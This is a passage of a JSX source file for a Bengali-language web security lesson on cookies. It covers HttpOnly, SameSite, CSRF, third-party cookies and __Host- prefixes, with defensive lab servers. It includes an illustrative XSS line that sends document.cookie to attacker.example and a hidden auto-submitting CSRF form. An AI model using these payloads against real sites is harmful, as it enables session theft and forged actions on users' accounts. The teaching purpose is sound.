                মুছতে বা বদলাতেও পারে না। HTTPS কীভাবে পথের মানুষ থেকে Header লুকায়, সেটা লেসন ০৭
                এর পুরো গল্প। এখানে শুধু এটুকু: HTTPS ছাড়া Secure অর্থহীন, আর Secure ছাড়া একটা
                ভুল <code>http://</code> Link ই Cookie ফাঁস করে দিতে পারে। Development এর জন্য একটা
                ছাড় আছে, Chrome আর Firefox <code>http://localhost</code> কে নিরাপদ জায়গা ধরে, তাই
                সেখানে Secure Cookie চলে।
              </ContentParagraph>
              <ContentParagraph>
                <strong>দ্বিতীয় রাস্তা, পাতার ভেতর থেকে।</strong> ধরুন Island Tours এর Review অংশে
                একজন মন্তব্যের জায়গায় লিখলেন কয়েক লাইনের JavaScript, আর সাইটটা সেটা Escape না করেই পাতায়
                বসিয়ে দিল। এখন যে পর্যটক সেই Review পড়বেন, তাঁর Browser এ সেই Script চলবে, Island
                Tours এর নিজের Script এর সব অধিকার নিয়ে। এর নাম <strong>XSS</strong>, Cross-Site
                Scripting। সেই Script এর এক লাইনই যথেষ্ট।
              </ContentParagraph>
            </div>
          ),
        },
        {
          type: CONTENT_TYPES.CODE_BLOCK,
          language: "javascript",
          filename: "xss-steals-cookies.js",
          code: `// আক্রমণকারীর ঢোকানো Script, পর্যটকের Browser এ Island Tours এর পাতায় চলছে
new Image().src = "https://attacker.example/c?" + encodeURIComponent(document.cookie);

// HttpOnly না থাকলে document.cookie তে থাকত:  __Host-session=Gx2f9Q...; theme=dark
// HttpOnly থাকলে document.cookie তে থাকে শুধু:   theme=dark`,
        },
        {
          type: CONTENT_TYPES.HTML,
          content: (
            <div className="space-y-6">
              <ContentParagraph>
                তালাটার নাম <strong>HttpOnly</strong>। HttpOnly লেখা Cookie Browser Request এ ঠিকই
                পাঠায়, কিন্তু Page এর JavaScript কে দেখতেই দেয় না। <code>document.cookie</code>{" "}
                এ তার নামও আসে না, Script দিয়ে বদলানো বা মোছাও যায় না। ফলে উপরের Script টা চুরি
                করার মতো কিছু পায় না।
              </ContentParagraph>
              <ContentParagraph>
                কিন্তু সৎ থাকি, HttpOnly XSS সারায় না। ঢুকে পড়া Script টা Cookie পড়তে পারে না ঠিক,
                তবে পাতা খোলা থাকা পর্যন্ত সে পর্যটকের নামে Request পাঠাতে পারে, আর Browser সেই
                Request এ নিজেই Cookie জুড়ে দেবে। HttpOnly এর কাজ হলো চাবিটা চিরদিনের মতো চুরি হওয়া
                থেকে বাঁচানো, যাতে আক্রমণটা পাতা বন্ধ হলেই থামে। XSS এর আসল ওষুধ অন্য জায়গায়:
                ব্যবহারকারীর লেখা সবসময় Escape করে দেখানো, আর লেসন ০৪ এর Content-Security-Policy
                Header।
              </ContentParagraph>
            </div>
          ),
        },
        {
          type: CONTENT_TYPES.COMPARE_TABLE,
          headers: ["", "Secure", "HttpOnly"],
          rows: [
            ["কোন চুরি ঠেকায়", "পথের মাঝে কেউ Header পড়ে ফেলা", "পাতায় ঢুকে পড়া Script এর document.cookie পড়া"],
            ["Browser কী করে", "শুধু HTTPS Request এ পাঠায়", "Request এ পাঠায়, কিন্তু JavaScript কে দেখায় না"],
            ["কী ঠেকায় না", "XSS, CSRF", "পথের মাঝে পড়া, CSRF, পাতা খোলা থাকতে নামে Request পাঠানো"],
            ["কোন Cookie তে", "Production এ সবগুলোতে", "যেটা শুধু Server এর জন্য: Session, Login, যেকোনো টোকেন"],
            ["কোথায় দেয়া যায় না", "সাধারণ http:// সাইটে, localhost বাদে", "যে Cookie পাতার Script কে পড়তেই হবে, যেমন Client এ Theme বসানো"],
          ],
        },
      ],
    },
    /* ---------------------------------------------------------------- 7 */
    {
      id: "site-vs-origin",
      subHeader: { index: "007", title: "Site vs Origin" },
      title: <SectionTitle>Origin আর Site: শুনতে এক, প্রশ্ন দুইটা আলাদা</SectionTitle>,
      blocks: [
        {
          type: CONTENT_TYPES.HTML,
          content: (
            <div className="space-y-6">
              <ContentParagraph>
                পরের সেকশনের SameSite বুঝতে হলে আগে একটা শব্দ পরিষ্কার করতে হবে, Site। লেসন ০১ এ
                Origin শিখেছেন: Scheme, Host আর Port, তিনটাই হুবহু মিললে একই Origin।{" "}
                <code>https://islandtours.example</code> আর{" "}
                <code>https://blog.islandtours.example</code> আলাদা Origin, কারণ Host আলাদা।
              </ContentParagraph>
              <ContentParagraph>
                <strong>Site</strong> এর প্রশ্নটা ঢিলা। এটা জিজ্ঞেস করে, এই দুইটা ঠিকানা কি একই
                মালিকের একই সংসারের? সেটা মাপা হয় Scheme আর <strong>Registrable Domain</strong> দিয়ে।
                Registrable Domain মানে সেই নামটা, যেটা কেউ একজন Registrar থেকে কিনেছেন, Module 04
                এর দ্বিতীয় লেসনের ভাষায় যার Registrant একজন মানুষ। islandtours.example এর সব
                Subdomain একই Registrable Domain এর নিচে, তাই সবাই একই Site।
              </ContentParagraph>
            </div>
          ),
        },
        { type: CONTENT_TYPES.CUSTOM, component: <OriginSiteDiagram /> },
        {
          type: CONTENT_TYPES.HTML,
          content: (
            <div className="space-y-6">
              <ContentParagraph>
                কিন্তু Browser কীভাবে জানবে কোন অংশটা কেনা নাম? শেষ দুইটা অংশ নিলেই হবে না।{" "}
                <code>co.uk</code> এর নিচে হাজার হাজার আলাদা কোম্পানি নাম কেনে, আবার{" "}
                <code>github.io</code> এর নিচে হাজার হাজার আলাদা মানুষ নিজের সাইট চালান। এদের
                প্রত্যেককে একই Site ধরলে একজনের সাইট আরেকজনের Cookie বসিয়ে দিতে পারত। তাই আছে{" "}
                <strong>Public Suffix List</strong>, Mozilla এর রক্ষণাবেক্ষণ করা একটা খোলা তালিকা, যেখানে
                লেখা আছে কোন কোন শেষাংশের নিচে যে কেউ আলাদা নাম নিতে পারেন: <code>com</code>,{" "}
                <code>com.bd</code>, <code>co.uk</code>, <code>github.io</code>, এরকম কয়েক হাজার।
                Registrable Domain হলো Public Suffix আর তার ঠিক বাঁয়ের একটা অংশ। সেকশন ০০৫ এর{" "}
                <code>Domain=example</code> নিষেধ ঠিক এই কারণে, একটা Public Suffix এর নামে Cookie
                বসানো মানে তার নিচের সবার জন্য বসানো।
              </ContentParagraph>
              <ContentParagraph>
                আরেকটা ছোট নিয়ম। Chrome ২০২১ সাল থেকে Scheme কেও Site এর অংশ ধরে, যার নাম Schemeful
                Same-Site। তাই <code>http://islandtours.example</code> আর{" "}
                <code>https://islandtours.example</code> আজ আলাদা Site। Port কিন্তু Site এর হিসাবে
                নেই। নিচের Lab এ জোড়া বেছে নিজে মিলিয়ে দেখুন।
              </ContentParagraph>
            </div>
          ),
        },
        { type: CONTENT_TYPES.CUSTOM, component: <SiteOriginLab /> },
        {
          type: CONTENT_TYPES.COMPARE_TABLE,
          headers: ["জোড়া", "একই Origin?", "একই Site?", "কেন"],
          rows: [
            [<code key="a">islandtours.example, blog.islandtours.example</code>, "না", "হ্যাঁ", "Host আলাদা, Registrable Domain এক"],
            [<code key="a">islandtours.example, islandtours.example:8443</code>, "না", "হ্যাঁ", "শুধু Port আলাদা, Site Port দেখে না"],
            [<code key="a">http://islandtours.example, https://islandtours.example</code>, "না", "না", "Scheme আলাদা"],
            [<code key="a">islandtours.example, seagulltours.example</code>, "না", "না", "দুইটা আলাদা কেনা নাম"],
            [<code key="a">localhost:3000, 127.0.0.1:3000</code>, "না", "না", "একই যন্ত্র, কিন্তু Browser এর চোখে দুইটা আলাদা নাম"],
          ],
        },
        {
          type: CONTENT_TYPES.INFO_BOX,
          variant: INFO_BOX_VARIANTS.CONCEPT,
          title: "তিনটা নিয়ম, তিন রকম মাপকাঠি",
          content: (
            <p>
              এই Module এ একই চেহারার তিনটা প্রশ্ন আসে, আর তিনটা আলাদা মাপকাঠিতে চলে। CORS, যেটা
              লেসন ০৪ এ শিখেছেন, Origin দিয়ে চলে। SameSite, যেটা পরের সেকশনে, Site দিয়ে চলে। আর
              Cookie এর Domain আর Path শুধু Host আর Path দেখে, Port বা Scheme কোনোটাই না, শুধু Secure
              থাকলে Scheme। Production এ অদ্ভুত আচরণ দেখলে প্রথমে জিজ্ঞেস করুন, এখানে কোন নিয়মটা
              খাটছে, আর সেটা কোন মাপকাঠিতে মাপে।
            </p>
          ),
        },
      ],
    },
    /* ---------------------------------------------------------------- 8 */
    {
      id: "samesite",
      subHeader: { index: "008", title: "SameSite" },
      title: <SectionTitle>SameSite: অন্য সাইট থেকে শুরু হলে Cookie যাবে কি না</SectionTitle>,
      blocks: [
        {
          type: CONTENT_TYPES.HTML,
          content: (
            <div className="space-y-6">
              <ContentParagraph>
                এবার Browser এর তৃতীয় প্রশ্ন, আর এটা সবচেয়ে নতুন। Request টা যে পাতা থেকে শুরু হলো,
                সেই পাতা কি একই Site এর? Address Bar এ যে সাইট খোলা, সেটা যদি Request এর গন্তব্যের
                চেয়ে আলাদা Site হয়, Request টা <strong>Cross-site</strong>। পর্যটক attacker.example
                এর পাতায় আছেন আর সেই পাতা islandtours.example এ একটা Request পাঠাল, এটা Cross-site।
                blog.islandtours.example এর পাতা থেকে islandtours.example এ গেলে, এটা Same-site, কারণ
                দুইটা একই Site।
              </ContentParagraph>
              <ContentParagraph>
                <code>SameSite</code> Attribute ঠিক করে Cross-site Request এ Cookie যাবে কি না। এর
                তিনটা মান।
              </ContentParagraph>
              <ContentList>
                <ListItem>
                  <strong>SameSite=Strict:</strong> Cross-site হলে কখনো না। এমনকি পর্যটক নিজে অন্য
                  সাইটের একটা Link এ ক্লিক করে Island Tours এ এলেও প্রথম পাতায় Cookie যাবে না, তিনি
                  Login নেই দেখবেন। সবচেয়ে কড়া, আর সেই কারণে সাধারণ Login Cookie এর জন্য একটু বেশি
                  কড়া। বন্ধু WhatsApp এ বুকিং এর Link পাঠালেন, পর্যটক ক্লিক করলেন, আর সাইট বলল আবার
                  Login করুন। এমন অভিজ্ঞতা কেউ চান না।
                </ListItem>
                <ListItem>
                  <strong>SameSite=Lax:</strong> Cross-site এ সাধারণত না, একটা ছাড় ছাড়া। পর্যটক
                  যদি Link এ ক্লিক করে পুরো পাতাটাই Island Tours এ নিয়ে আসেন, মানে Top-level
                  Navigation হয়, আর Method টা নিরাপদ, মানে GET, তাহলে Cookie যাবে। অন্য সাইটের ভেতর
                  থেকে লুকিয়ে পাঠানো ছবি, fetch, iframe বা POST Form এ যাবে না। বেশিরভাগ Login Cookie
                  এর জন্য এটাই ঠিক মাপ, Island Tours ও এটাই ব্যবহার করে।
                </ListItem>
                <ListItem>
                  <strong>SameSite=None:</strong> সব জায়গায়, Cross-site হলেও। তবে শর্ত আছে, সাথে
                  Secure থাকতেই হবে, না থাকলে Browser Cookie টাই ফেলে দেয়। এটা লাগে তখন, যখন আপনার
                  সাইট সত্যিই অন্যের পাতার ভেতরে কাজ করে, যেমন একটা Payment Widget বা Embed করা
                  Chat। আর এখানে আরেকটা দেয়াল আছে, Third-party Cookie এর নিয়ম, সেকশন ০১০ এ।
                </ListItem>
              </ContentList>
              <ContentParagraph>
                SameSite না লিখলে কী হয়? এখানে Browser গুলো একমত নয়, তাই ভালো করে মনে রাখুন। Chrome
                আর Edge ২০২০ সাল থেকে লেখা না থাকা Cookie কে Lax ধরে, তবে একটা ছোট ছাড় সহ: Cookie টা
                ২ মিনিটের কম আগে বসানো হলে Top-level POST এ পাঠিয়ে দেয়, যাতে পুরনো কিছু Login ব্যবস্থা
                হঠাৎ না ভাঙে। Firefox আর Safari এই নিয়ম সবার জন্য চালু করেনি, আর কে কবে বদলাবে তার ঠিক নেই। ফলে একই Code
                এক Browser এ নিরাপদ, আরেকটায় নয়। নিয়ম একটাই: প্রতিটা Cookie তে SameSite নিজে লিখুন,
                Default এর ভরসায় রাখবেন না।
              </ContentParagraph>
            </div>
          ),
        },
        { type: CONTENT_TYPES.CUSTOM, component: <SameSiteLab /> },
        {
          type: CONTENT_TYPES.HTML,
          content: (
            <div className="space-y-6">
              <ContentParagraph>
                Lax এর ছাড়টা থেকে একটা কঠিন নিয়ম বেরিয়ে আসে, যেটা লেসন ০৩ এর Safe Method এর
                ধারণার সাথে সরাসরি জোড়া: <strong>GET দিয়ে কখনো কিছু বদলাবেন না।</strong>{" "}
                <code>GET /bookings/bk_7Q2M9X/cancel</code> এর মতো একটা ঠিকানা থাকলে, attacker.example
                শুধু একটা Link দিয়েই পর্যটককে সেখানে পাঠাতে পারে, আর Lax Cookie সাথে যাবে, কারণ এটা
                Top-level GET। বাতিল, বদল, মুছে ফেলা, সব কাজ POST, PATCH বা DELETE এ।
              </ContentParagraph>
              <ContentParagraph>
                আর JavaScript এর fetch এর কথা আলাদা করে বলি। একই Origin এ fetch করলে Browser Cookie
                পাঠায়। অন্য Origin এ পাঠাতে হলে Code এ{" "}
                <code>{`fetch(url, { credentials: "include" })`}</code> লিখতে হয়, আর ওপাশের Server কে
                লেসন ০৪ এর CORS Header দিয়ে অনুমতি দিতে হয়:{" "}
                <code>Access-Control-Allow-Credentials: true</code>, সাথে ঠিক Origin এর নাম, তারকা
                চিহ্ন চলবে না। এই দুইটা মিলে গেলেও SameSite এর নিয়ম তার উপরে খাটে। Cross-site fetch এ
                Lax Cookie তখনো যাবে না। CORS ঠিক করে দেয় Script উত্তরটা পড়তে পারবে কি না, SameSite
                ঠিক করে Cookie যাবে কি না। দুইটা আলাদা দরজা।
              </ContentParagraph>
            </div>
          ),
        },
      ],
    },
    /* ---------------------------------------------------------------- 9 */
    {
      id: "csrf",
      subHeader: { index: "009", title: "CSRF" },
      title: <SectionTitle>CSRF: আপনার নামে অন্য কেউ বোতাম চাপলে</SectionTitle>,
      blocks: [
        {
          type: CONTENT_TYPES.HTML,
          content: (
            <div className="space-y-6">
              <ContentParagraph>
                SameSite কেন এলো, সেটা বুঝতে একটা আক্রমণের গল্প শুনুন। পুরনো Island Tours এ বুকিং
                বাতিলের একটা সাধারণ HTML Form ছিল, লেসন ০৩ এ দেখেছেন Form শুধু GET আর POST পাঠাতে
                পারে, তাই এটা <code>POST /bookings/bk_7Q2M9X/cancel</code>। পর্যটক Login করা, Jar এ
                Session Cookie আছে। এক সন্ধ্যায় তিনি একটা Email পেলেন, দারুণ ছাড়ের খবর, একটা Link সহ।
                ক্লিক করতেই খুলল attacker.example এর একটা পাতা, যার ভেতরে এটুকু লেখা।
              </ContentParagraph>
            </div>
          ),
        },
        {
          type: CONTENT_TYPES.CODE_BLOCK,
          language: "html",
          filename: "attacker.example/offer.html",
          code: `<!-- পাতায় কিছুই দেখা যায় না, শুধু একটা লুকানো Form -->
<form id="f" method="POST" action="https://islandtours.example/bookings/bk_7Q2M9X/cancel">
  <input type="hidden" name="reason" value="changed my mind">
</form>
<script>document.getElementById("f").submit();</script>`,
        },
        {
          type: CONTENT_TYPES.HTML,
          content: (
            <ContentParagraph>
              পাতা খুলতেই Form টা নিজে Submit হলো। Browser একটা POST পাঠাল islandtours.example এ।
              এখন প্রশ্নটা একটাই: Browser কি এই Request এ পর্যটকের Session Cookie জুড়ে দেবে?
            </ContentParagraph>
          ),
        },
        { type: CONTENT_TYPES.CUSTOM, component: <CsrfStorySplit /> },
        {
          type: CONTENT_TYPES.HTML,
          content: (
            <div className="space-y-6">
              <ContentParagraph>
                এর নাম <strong>CSRF</strong>, Cross-Site Request Forgery, অন্য সাইট থেকে জাল
                Request। আক্রমণকারী Cookie টা কখনো দেখেনি, চুরিও করেনি। সে শুধু পর্যটকের Browser কে
                দিয়ে একটা Request পাঠিয়েছে, আর পুরনো নিয়মে Browser Cookie জুড়ত গন্তব্য দেখে, Request
                কে শুরু করল সেটা দেখে নয়। Server এর চোখে তাই এটা পর্যটকের নিজের Request এর মতোই।
                HttpOnly এখানে কিছুই করে না, কারণ কাউকে Cookie পড়তে হয়নি।
              </ContentParagraph>
              <ContentParagraph>
                আজকের Island Tours এ এই আক্রমণ চারটা স্তরে আটকায়। একটা স্তর ভুল হলেও বাকিগুলো ধরে।
              </ContentParagraph>
              <ContentList>
                <ListItem>
                  <strong>SameSite=Lax বা Strict।</strong> Cross-site POST এ Cookie যায় না, ফলে
                  Server জানেই না কার বুকিং। সবচেয়ে বড় দেয়াল, প্রায় বিনা খরচে।
                </ListItem>
                <ListItem>
                  <strong>GET দিয়ে কিছু বদলায় না।</strong> নাহলে Lax এর ছাড় দিয়েই আক্রমণ ঢুকে যেত।
                </ListItem>
                <ListItem>
                  <strong>Origin Header যাচাই।</strong> লেসন ০৪ এ দেখেছেন, Browser POST এর সাথে{" "}
                  <code>Origin</code> Header পাঠায়, আর পাতার Script সেটা বদলাতে পারে না। Server
                  প্রতিটা বদলানোর Request এ দেখে Origin টা নিজের তালিকায় আছে কি না। Browser আরও একটা
                  Header পাঠায়, <code>Sec-Fetch-Site</code>, যার মান <code>same-origin</code>,{" "}
                  <code>same-site</code>, <code>cross-site</code> বা <code>none</code>। দুইটাই একই
                  প্রশ্নের উত্তর দেয়, Request টা কোথা থেকে শুরু।
                </ListItem>
                <ListItem>
                  <strong>CSRF Token।</strong> Server প্রতিটা Form এ একটা Random লুকানো টোকেন বসায়
                  আর Session এর সাথে মিলিয়ে রাখে। Submit এ টোকেন না মিললে Request বাতিল।
                  attacker.example সেই টোকেন জানতে পারে না, কারণ Island Tours এর পাতা পড়ার অনুমতি
                  তার নেই। পুরনো Browser আর জটিল ক্ষেত্রের জন্য এটাই সবচেয়ে নির্ভরযোগ্য স্তর।
                </ListItem>
              </ContentList>
              <ContentParagraph>
                নিচে Origin যাচাইয়ের একটা ছোট Server, এই যন্ত্রে চালানো। অনুমোদিত Origin এর তালিকা
                Code এ লেখা নেই, Environment Variable থেকে আসে, আর না থাকলে Server চালুই হয় না।
              </ContentParagraph>
            </div>
          ),
        },
        {
          type: CONTENT_TYPES.CODE_BLOCK,
          language: "javascript",
          filename: "origin-check.mjs",
          code: `// চালান:  LAB_PORT=47652 ALLOWED_ORIGINS="https://islandtours.example" node origin-check.mjs
import http from "node:http";

const port = Number(process.env.LAB_PORT);
if (!port) throw new Error("LAB_PORT is not set");
const raw = process.env.ALLOWED_ORIGINS;
if (!raw) throw new Error("ALLOWED_ORIGINS is not set");
const allowedOrigins = new Set(raw.split(",").map((origin) => origin.trim()));

const SAFE_METHODS = new Set(["GET", "HEAD", "OPTIONS"]);

// যে Request কিছু বদলায়, তার Origin অবশ্যই আমাদের তালিকায় থাকতে হবে
function isCrossSiteWrite(req) {
  if (SAFE_METHODS.has(req.method)) return false;
  const origin = req.headers.origin;
  return !origin || !allowedOrigins.has(origin);
}

http
  .createServer((req, res) => {
    if (isCrossSiteWrite(req)) {
      res.statusCode = 403;
      return res.end(\`refused: Origin \${req.headers.origin ?? "(missing)"}\\n\`);
    }
    res.end(\`\${req.method} \${req.url} accepted\\n\`);
  })
  .listen(port);

// এই যন্ত্রে চালানোর আসল ফলাফল:
// URL=http://localhost:47652/bookings/bk_7Q2M9X/cancel
// $ curl -s -X POST -H "Origin: https://islandtours.example" $URL
//   POST /bookings/bk_7Q2M9X/cancel accepted
// $ curl -s -X POST -H "Origin: https://attacker.example" -w "status %{http_code}\\n" $URL
//   refused: Origin https://attacker.example
//   status 403
// $ curl -s -X POST -w "status %{http_code}\\n" $URL     # Origin ছাড়া
//   refused: Origin (missing)
//   status 403
// $ curl -s $URL                                         # GET
//   GET /bookings/bk_7Q2M9X/cancel accepted`,
        },
        {
          type: CONTENT_TYPES.HTML,
          content: (
            <ContentParagraph>
              শেষ লাইনটা খেয়াল করুন। GET টা নির্দ্বিধায় ঢুকে গেল, কারণ যাচাইটা শুধু বদলানোর
              Request এর জন্য। এই কারণেই আগের স্তরটা, GET দিয়ে কিছু না বদলানো, এত জরুরি।
            </ContentParagraph>
          ),
        },
        {
          type: CONTENT_TYPES.INFO_BOX,
          variant: INFO_BOX_VARIANTS.WARNING,
          title: "Same-site মানে নিরাপদ নয়",
          content: (
            <p>
              SameSite শুধু Site দেখে। blog.islandtours.example এ একটা দুর্বলতা পেয়ে কেউ সেখান থেকে
              একটা Form পাঠালে, Browser এর চোখে সেটা Same-site, Strict Cookie ও চলে যাবে। Subdomain
              গুলো যদি আলাদা মানুষ বা আলাদা Server চালায়, যেমন Island Tours এর Blog, তাহলে শুধু
              SameSite এর ভরসায় থাকবেন না। Origin যাচাইয়ের তালিকায় শুধু সেই Origin রাখুন যেগুলো সত্যিই
              বদলানোর Request পাঠায়, এখানে <code>https://islandtours.example</code> আর{" "}
              <code>https://admin.islandtours.example</code>, Blog নয়।
            </p>
          ),
        },
      ],
    },
    /* --------------------------------------------------------------- 10 */
    {
      id: "third-party",
      subHeader: { index: "010", title: "Third-party Cookies" },
      title: <SectionTitle>Third-party Cookie: অন্যের পাতায় বসে থাকা Cookie</SectionTitle>,
      blocks: [
        {
          type: CONTENT_TYPES.HTML,
          content: (
            <div className="space-y-6">
              <ContentParagraph>
                Seagull Tours নামের একটা Partner সাইট, seagulltours.example, নিজের পাতায় Island
                Tours এর বুকিং Widget বসিয়েছে, একটা iframe হিসেবে। পর্যটক seagulltours.example খুলে
                রেখেছেন, Address Bar এ সেটাই। এই মুহূর্তে seagulltours.example এর নিজের Cookie গুলো{" "}
                <strong>First-party Cookie</strong>, মানে Address Bar এর সাইটের। আর Widget এর ভেতর
                থেকে islandtours.example এ যে Request যাচ্ছে, তার Cookie গুলো{" "}
                <strong>Third-party Cookie</strong>, কারণ সেগুলো Address Bar এর সাইটের নয়, ভেতরে
                বসানো আরেকজনের।
              </ContentParagraph>
              <ContentParagraph>
                Third-party Cookie নিজে খারাপ কিছু নয়, কিন্তু এর একটা ব্যবহার Browser গুলোকে ভাবিয়েছে।
                ধরুন একটা বিজ্ঞাপন Company এক হাজার সাইটে নিজের একটা অদৃশ্য ছবি বসিয়েছে। প্রতিটা সাইটে
                সেই ছবির Request যায় Company র Server এ, সাথে Company র একই Cookie। ফলে Company দেখতে
                পায় একই মানুষ আজ কোন কোন সাইট ঘুরলেন। কেউ তাঁকে জিজ্ঞেস করেনি, তিনি জানেনও না। এই
                কারণেই গত কয়েক বছরে Browser গুলো Third-party Cookie এর উপর হাত দিয়েছে, আর একেকজন একেক
                পথে।
              </ContentParagraph>
            </div>
          ),
        },
        { type: CONTENT_TYPES.CUSTOM, component: <ThirdPartyCookieDiagram /> },
        {
          type: CONTENT_TYPES.HTML,
          content: (
            <div className="space-y-6">
              <ContentParagraph>
                ২০২৬ সালে অবস্থাটা এরকম, প্রতিটা Browser এর নিজের ঘোষণা থেকে মিলিয়ে।
              </ContentParagraph>
              <ContentList>
                <ListItem>
                  <strong>Safari</strong> ২০২০ সালের Safari 13.1 থেকে সব Third-party Cookie বন্ধ
                  রাখে, Default এ। এর পেছনের ব্যবস্থার নাম Intelligent Tracking Prevention।
                </ListItem>
                <ListItem>
                  <strong>Firefox</strong> পুরো বন্ধ করে না, ভাগ করে রাখে। Total Cookie Protection
                  নামের ব্যবস্থায় প্রতিটা Top-level সাইটের জন্য একটা আলাদা Jar। seagulltours.example
                  এর ভেতরে বসা Island Tours এর Widget যে Cookie পায়, সেটা islandtours.example সরাসরি
                  খুললে পাওয়া Cookie থেকে আলাদা। ফলে এক সাইট থেকে আরেক সাইটে মানুষকে অনুসরণ করা যায় না।
                </ListItem>
                <ListItem>
                  <strong>Chrome</strong> অনেক বছর ধরে বলছিল Third-party Cookie তুলে দেবে। ২০২৫ সালের
                  এপ্রিলে Google ঘোষণা দিয়ে সেই পরিকল্পনা থেকে সরে এসেছে। Chrome এ Third-party Cookie
                  Default এ চালু, Incognito তে বন্ধ, আর ব্যবহারকারী চাইলে Setting থেকে বন্ধ করতে পারেন।
                  এর বদলে আনা Privacy Sandbox এর বেশিরভাগ ব্যবস্থাও ২০২৫ সালের অক্টোবরে অবসরে গেছে।
                </ListItem>
                <ListItem>
                  <strong>Brave</strong> Default এ Third-party Cookie বন্ধ রাখে। Edge Chrome এর
                  ইঞ্জিনেই চলে, Default আচরণ Chrome এর কাছাকাছি।
                </ListItem>
              </ContentList>
              <ContentParagraph>
                একজন Developer এর জন্য শিক্ষাটা কিন্তু Chrome এর সিদ্ধান্তের উপর নির্ভর করে না।
                আপনার ব্যবহারকারীদের একটা বড় অংশ iPhone এ, আর iPhone এর প্রতিটা Browser ভেতরে Safari র
                ইঞ্জিনেই চলে। তাই ধরে নিন, Third-party Cookie এর উপর দাঁড়ানো যেকোনো Feature অনেকের
                কাছে ভাঙবে। Island Tours তাই Widget এর ভেতরে Login রাখেনি। Widget শুধু ট্যুর আর খালি
                আসন দেখায়, বুক করতে চাইলে একটা বোতাম পুরো পাতাটা islandtours.example এ নিয়ে যায়, যেখানে
                Cookie গুলো আবার First-party।
              </ContentParagraph>
              <ContentParagraph>
                দুইটা নতুন যন্ত্রও জেনে রাখুন। প্রথমটা <strong>Partitioned</strong> Attribute, যার
                পেছনের প্রস্তাবের নাম CHIPS। এই Attribute দেওয়া Cookie Browser রাখে দুইটা চাবি মিলিয়ে:
                Cookie এর নিজের সাইট আর Address Bar এর সাইট। seagulltours.example এর ভেতরে বসানো
                Widget এর Cookie শুধু সেখানেই পাওয়া যাবে, অন্য কোনো সাইটের ভেতরে বসানো একই Widget সেটা
                দেখবে না, তাই এটা দিয়ে অনুসরণ করা যায় না। Chrome আর Edge এ এটা চালু, অন্য Browser এর
                অবস্থা MDN এর Browser Compatibility ছকে দেখে নিন। দ্বিতীয়টা{" "}
                <strong>Storage Access API</strong>, যেখানে iframe ব্যবহারকারীর অনুমতি চেয়ে নিজের
                First-party Cookie ব্যবহারের সুযোগ পায়। Embed করা Comment বা Login এর জন্য এটা কাজে
                লাগে।
              </ContentParagraph>
            </div>
          ),
        },
        {
          type: CONTENT_TYPES.CODE_BLOCK,
          language: "http",
          filename: "widget-response.http",
          code: `# Widget এর ঝুড়ির জন্য একটা Partitioned Cookie, শুধু seagulltours.example এর ভেতরের Widget এ চলবে
set-cookie: __Host-widget_cart=c_81; Path=/; Secure; HttpOnly; SameSite=None; Partitioned`,
        },
      ],
    },
    /* --------------------------------------------------------------- 11 */
    {
      id: "limits-prefixes",
      subHeader: { index: "011", title: "Prefixes and Limits" },
      title: <SectionTitle>নামের আগে __Host-, আর মাপের সীমা</SectionTitle>,
      blocks: [
        {
          type: CONTENT_TYPES.HTML,
          content: (
            <div className="space-y-6">
              <ContentParagraph>
                Island Tours এর Login Cookie এর নাম শুধু <code>session</code> নয়,{" "}
                <code>__Host-session</code>। শুরুর এই অংশটাকে বলে <strong>Cookie Prefix</strong>,
                আর এটা Browser এর কাছে একটা প্রতিজ্ঞা। নামে এই Prefix থাকলে Browser Cookie টা নেবেই
                না, যদি কয়েকটা শর্ত না মেলে। দুইটা Prefix আছে।
              </ContentParagraph>
              <ContentList>
                <ListItem>
                  <code>__Secure-</code>: Cookie টায় Secure থাকতে হবে, আর বসাতে হবে একটা HTTPS পাতা
                  থেকে।
                </ListItem>
                <ListItem>
                  <code>__Host-</code>: উপরের সব, সাথে <code>Path=/</code> আর কোনো Domain নয়। মানে
                  Cookie টা ঠিক এই একটা Host এ বাঁধা, আর কেউ এর জায়গা নিতে পারবে না।
                </ListItem>
              </ContentList>
              <ContentParagraph>
                কেন এত কড়াকড়ি? একটা আক্রমণের নাম Cookie Tossing। ধরুন blog.islandtours.example এর
                দখল কেউ নিল। সেখান থেকে সে <code>Domain=islandtours.example</code> দিয়ে একটা{" "}
                <code>session</code> Cookie বসিয়ে দিল, নিজের Account এর। পর্যটক এরপর islandtours.example
                এ গেলে Browser দুইটা session পাঠাবে, আর Server ভুলটা নিলে পর্যটক আক্রমণকারীর Account এ
                ঢুকে নিজের কার্ডের তথ্য দিয়ে বসবেন। নামটা <code>__Host-session</code> হলে এটা অসম্ভব,
                কারণ Domain সহ কোনো <code>__Host-</code> Cookie Browser নেয়ই না। নিচের পরীক্ষাটা curl
                দিয়ে, যে Browser এর মতোই এই নিয়ম মানে।
              </ContentParagraph>
            </div>
          ),
        },
        {
          type: CONTENT_TYPES.CODE_BLOCK,
          language: "javascript",
          filename: "prefix-probe.mjs",
          code: `// চালান:  LAB_PORT=47651 node prefix-probe.mjs
import http from "node:http";

const port = Number(process.env.LAB_PORT);
if (!port) throw new Error("LAB_PORT is not set");

const lines = {
  "/set": [
    "__Host-a=1; Path=/; Secure",
    "__Host-b=1; Path=/",
    "__Host-c=1; Path=/; Secure; Domain=localhost",
    "__Host-d=1; Path=/api; Secure",
  ],
  "/delete-wrong": ["__Host-a=; Path=/; Max-Age=0"],
  "/delete-right": ["__Host-a=; Path=/; Secure; Max-Age=0"],
};

http
  .createServer((req, res) => {
    if (lines[req.url]) res.setHeader("Set-Cookie", lines[req.url]);
    res.end(\`cookies: \${req.headers.cookie ?? "(none)"}\\n\`);
  })
  .listen(port);

// এই যন্ত্রে চালানোর আসল ফলাফল:
// $ curl -s -c pj.txt localhost:47651/set; curl -s -b pj.txt localhost:47651/
//   cookies: __Host-a=1
// $ curl -s -b pj.txt -c pj.txt localhost:47651/delete-wrong; curl -s -b pj.txt localhost:47651/
//   cookies: __Host-a=1
// $ curl -s -b pj.txt -c pj.txt localhost:47651/delete-right; curl -s -b pj.txt localhost:47651/
//   cookies: (none)`,
        },
        {
          type: CONTENT_TYPES.HTML,
          content: (
            <div className="space-y-6">
              <ContentParagraph>
                চারটার মধ্যে টিকল শুধু <code>__Host-a</code>। b এর Secure নেই, c তে Domain আছে, d
                এর Path <code>/</code> নয়, তিনটাই নীরবে বাদ। আর দ্বিতীয় অংশটা আরও কাজের: Secure
                ছাড়া মোছার লাইনটাও Browser নিল না, কারণ মোছার লাইনটাও একটা Set-Cookie, তাকেও Prefix
                এর শর্ত মানতে হয়। <code>__Host-</code> Cookie মুছতে হলে মোছার লাইনেও{" "}
                <code>Secure; Path=/</code> লিখতে হবে। এই ভুলে বহু সাইটের Logout বোতাম কাজ করে না।
